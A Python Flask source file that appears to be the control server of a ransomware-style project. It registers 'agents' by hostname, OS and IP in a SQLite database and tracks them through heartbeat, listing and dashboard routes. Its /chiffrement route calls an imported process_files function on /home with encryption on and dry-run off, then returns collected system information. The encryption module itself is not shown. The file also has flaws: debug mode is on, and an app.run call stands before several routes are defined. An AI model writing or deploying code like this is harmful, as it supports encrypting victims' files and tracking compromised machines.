
import sys
from pathlib import Path
import sqlite3
import time
import uuid
from flask import Flask, request, jsonify, render_template
try:
    from chiff import process_files, request as get_system_info
except ModuleNotFoundError:
    
    
    
    import importlib.util
    import os
    chiff_path = os.path.join(os.path.dirname(__file__), 'chiff.py')
    spec = importlib.util.spec_from_file_location('chiff', chiff_path)
    chiff = importlib.util.module_from_spec(spec)
    sys.modules['chiff'] = chiff
    spec.loader.exec_module(chiff)
    process_files = chiff.process_files
    get_system_info = chiff.request

DB_PATH = Path(__file__).with_name("agents.db")
ONLINE_THRESHOLD_SECONDS = 30

app = Flask(__name__)

def db_connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT NOT NULL,
            os TEXT NOT NULL,
            ip TEXT,
            version TEXT,
            first_seen INTEGER NOT NULL,
            last_seen INTEGER NOT NULL

        )
    """)


init_db()










@app.route('/chiffrement')
def chiffrement():
    import platform
    import socket
    agent_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    os_name = platform.system()
    ip = request.remote_addr or "127.0.0.1"
    version = "1.0"
    now = int(time.time())
    conn = db_connect()
    cur = conn.cursor()
    try:
        cur.execute(
            "INSERT OR REPLACE INTO agents (id, hostname, os, ip, version, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (
                agent_id,
                hostname,
                os_name,
                ip,
                version,
                now,
                now,
            ),
        )
        conn.commit()
    except Exception as e:
        conn.rollback()
        with open("file.logs", "a") as log_file:
            import traceback
            log_file.write(f"Exception dans /chiffrement (insert agent): {str(e)}\n")
            log_file.write(traceback.format_exc() + "\n")
    finally:
        conn.close()
    folder = '/home'  
    try:
        result = process_files(folder, chiffrement=True, dry_run=False)
        system_info = get_system_info()
        response = {
            'chiffrement_result': result,
            'system_info': system_info,
            'agent': {
                'id': agent_id,
                'hostname': hostname,
                'os': os_name,
                'ip': ip,
                'version': version
            }
        }
        return jsonify(response)
    except Exception as e:
        with open("file.logs", "a") as log_file:
            import traceback
            log_file.write(f"Exception dans /chiffrement : {str(e)}\n")
            log_file.write(traceback.format_exc() + "\n")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
    

@app.get("/")
def home():
    return jsonify(message="Hello, World!")

@app.get("/status")
def status():
    return jsonify(status="ok", db=str(DB_PATH), now=int(time.time()))




@app.post("/agents/<agent_id>/heartbeat")
def heartbeat(agent_id: str):
    now = int(time.time())
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("UPDATE agents SET last_seen=? WHERE id=?", (now, agent_id))
    conn.commit()
    updated = cur.rowcount
    conn.close()

    if updated == 0:
        return jsonify(error="unknown agent_id"), 404

    return jsonify(agent_id=agent_id, last_seen=now)





@app.get("/agents")
def list_agents():
    now = int(time.time())
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("SELECT * FROM agents ORDER BY last_seen DESC")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()

    for r in rows:
        age = now - int(r["last_seen"])
        r["status"] = "online" if age <= ONLINE_THRESHOLD_SECONDS else "offline"
        r["seconds_since_last_seen"] = age

    return jsonify(rows)

@app.get("/dashboard")
def dashboard():
    now = int(time.time())
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("SELECT * FROM agents ORDER BY last_seen DESC")
    agents = [dict(r) for r in cur.fetchall()]  
    conn.close()



    for a in agents:
        age = now - int(a["last_seen"])
        a["status"] = "online" if age <= ONLINE_THRESHOLD_SECONDS else "offline"
        a["seconds_since_last_seen"] = age

    return render_template("dashboard.html", agents=agents, now=now)  







        
        
        
        
        
        
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
     